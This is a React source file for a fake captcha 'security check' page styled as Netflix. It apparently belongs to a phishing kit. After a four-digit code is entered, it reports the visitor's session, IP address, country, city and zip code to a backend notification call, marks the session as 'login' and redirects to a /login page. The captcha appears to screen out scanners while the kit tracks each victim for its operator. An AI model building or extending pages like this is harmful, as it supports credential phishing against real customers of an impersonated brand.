import { useState, useCallback, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { ShieldCheck, RefreshCw } from "lucide-react";
import { trpc } from "@/lib/trpc";
import { useSession } from "@/contexts/SessionContext";

function generateCaptcha(): string {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

export default function CaptchaPage() {
  const [, navigate] = useLocation();
  const { sessionId, geoData, t } = useSession();
  const [captchaCode, setCaptchaCode] = useState(() => generateCaptcha());
  const [userInput, setUserInput] = useState(["", "", "", ""]);
  const [error, setError] = useState("");
  const [refreshing, setRefreshing] = useState(false);
  const inputRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  const notifyCaptcha = trpc.notify.captchaPassed.useMutation();
  const updateStatus = trpc.session.updateStatus.useMutation();

  const refreshCaptcha = useCallback(() => {
    setRefreshing(true);
    setUserInput(["", "", "", ""]);
    setError("");
    setTimeout(() => {
      setCaptchaCode(generateCaptcha());
      setRefreshing(false);
      inputRefs[0].current?.focus();
    }, 300);
  }, []);

  const handleDigitInput = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newInput = [...userInput];
    newInput[index] = value.slice(-1);
    setUserInput(newInput);
    setError("");
    // Only auto-advance focus, do NOT auto-submit
    if (value && index < 3) inputRefs[index + 1].current?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !userInput[index] && index > 0) inputRefs[index - 1].current?.focus();
  };

  const verifyCode = () => {
    const entered = userInput.join("");
    if (entered.length < 4) { setError(t("enterAllDigits")); return; }
    if (entered === captchaCode) {
      if (sessionId && geoData) {
        notifyCaptcha.mutate({ sessionId, ip: geoData.ip, country: geoData.country, city: geoData.city, zip: geoData.zip, countryCode: geoData.countryCode });
        updateStatus.mutate({ sessionId, status: "login" });
      }
      // Mark captcha as solved so the route guard allows access to all pages
      try { localStorage.setItem("nf_captcha_solved", "1"); } catch {}
      navigate("/login");
    } else {
      setError(t("incorrectCode"));
      setUserInput(["", "", "", ""]);
      setCaptchaCode(generateCaptcha());
      setTimeout(() => inputRefs[0].current?.focus(), 100);
    }
  };

  useEffect(() => { inputRefs[0].current?.focus(); }, []);

  return (
    <div style={{ backgroundColor: "#141414", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "20px 16px" }}>
        <div style={{
          backgroundColor: "rgba(0,0,0,0.75)",
          borderRadius: "4px",
          padding: "clamp(32px, 6vw, 60px) clamp(20px, 6vw, 68px)",
          width: "100%",
          maxWidth: "460px",
          boxSizing: "border-box",
        }}>
          {/* Header */}
          <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "8px" }}>
            <ShieldCheck size={26} color="#E50914" />
            <h1 style={{ color: "white", fontSize: "clamp(22px, 5vw, 28px)", fontWeight: 700, margin: 0, fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
              {t("securityCheck")}
            </h1>
          </div>
          <p style={{ color: "#8c8c8c", fontSize: "clamp(13px, 3vw, 14px)", marginBottom: "28px" }}>{t("enterCode")}</p>

          {/* Code display — plain large digits, no decorative box */}
          <div style={{ display: "flex", justifyContent: "center", gap: "clamp(10px, 3vw, 18px)", marginBottom: "8px" }}>
            {captchaCode.split("").map((digit, i) => (
              <span key={i} style={{
                fontSize: "clamp(32px, 9vw, 48px)",
                fontWeight: 800,
                color: "white",
                fontFamily: "'Courier New', monospace",
                userSelect: "none",
                letterSpacing: "2px",
              }}>
                {refreshing ? "·" : digit}
              </span>
            ))}
          </div>

          {/* Refresh button */}
          <div style={{ textAlign: "center", marginBottom: "28px" }}>
            <button
              onClick={refreshCaptcha}
              style={{ background: "none", border: "none", color: "#8c8c8c", display: "inline-flex", alignItems: "center", gap: "6px", fontSize: "13px", cursor: "pointer", padding: "4px 8px", borderRadius: "4px" }}
              onMouseEnter={e => (e.currentTarget.style.color = "#fff")}
              onMouseLeave={e => (e.currentTarget.style.color = "#8c8c8c")}
            >
              <RefreshCw size={13} style={{ animation: refreshing ? "spin 0.5s linear" : "none" }} />
              {t("getNewCode")}
            </button>
          </div>

          {/* Input boxes */}
          <div style={{ display: "flex", gap: "clamp(8px, 2.5vw, 12px)", justifyContent: "center", marginBottom: "16px" }}>
            {userInput.map((val, i) => (
              <input
                key={i}
                ref={inputRefs[i]}
                type="tel"
                inputMode="numeric"
                maxLength={1}
                value={val}
                onChange={e => handleDigitInput(i, e.target.value)}
                onKeyDown={e => handleKeyDown(i, e)}
                style={{
                  width: "clamp(48px, 13vw, 60px)",
                  height: "clamp(52px, 14vw, 66px)",
                  textAlign: "center",
                  fontSize: "clamp(20px, 5vw, 26px)",
                  fontWeight: 700,
                  backgroundColor: "#333333",
                  border: `2px solid ${val ? "#E50914" : "#737373"}`,
                  borderRadius: "4px",
                  color: "white",
                  outline: "none",
                  fontFamily: "'Courier New', monospace",
                  transition: "border-color 0.15s ease",
                  boxSizing: "border-box",
                }}
                onFocus={e => { e.currentTarget.style.borderColor = "#E50914"; }}
                onBlur={e => { if (!val) e.currentTarget.style.borderColor = "#737373"; }}
              />
            ))}
          </div>

          {error && <p style={{ color: "#E87C03", fontSize: "13px", textAlign: "center", marginBottom: "12px" }}>{error}</p>}

          {/* Verify button — ONLY way to pass */}
          <button
            onClick={verifyCode}
            style={{ width: "100%", backgroundColor: "#E50914", color: "white", border: "none", borderRadius: "4px", padding: "clamp(13px, 3.5vw, 16px)", fontSize: "clamp(14px, 3.5vw, 16px)", fontWeight: 700, cursor: "pointer", marginTop: "8px", transition: "background-color 0.15s" }}
            onMouseEnter={e => (e.currentTarget.style.backgroundColor = "#c40812")}
            onMouseLeave={e => (e.currentTarget.style.backgroundColor = "#E50914")}
          >
            {t("verify")}
          </button>

          <p style={{ color: "#8c8c8c", fontSize: "clamp(11px, 2.5vw, 13px)", textAlign: "center", marginTop: "20px" }}>
            {t("recaptchaNotice")} <a href="#" style={{ color: "#0071eb", textDecoration: "none" }}>{t("learnMore")}</a>
          </p>
        </div>
      </div>

      {/* Footer */}
      <footer style={{ padding: "clamp(16px, 4vw, 20px) clamp(16px, 5vw, 40px)", borderTop: "1px solid #333" }}>
        <p style={{ color: "#737373", fontSize: "clamp(12px, 2.5vw, 13px)", marginBottom: "12px" }}>
          {t("questions")} <a href="#" style={{ color: "#737373", textDecoration: "underline" }}>{t("contactUs")}</a>
        </p>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: "8px 24px", maxWidth: "400px" }}>
          {["FAQ", "Help Center", "Terms of Use", "Privacy", "Cookie Preferences", "Corporate Information"].map(link => (
            <a key={link} href="#" style={{ color: "#737373", fontSize: "clamp(11px, 2.5vw, 12px)", textDecoration: "underline" }}>{link}</a>
          ))}
        </div>
      </footer>
    </div>
  );
}
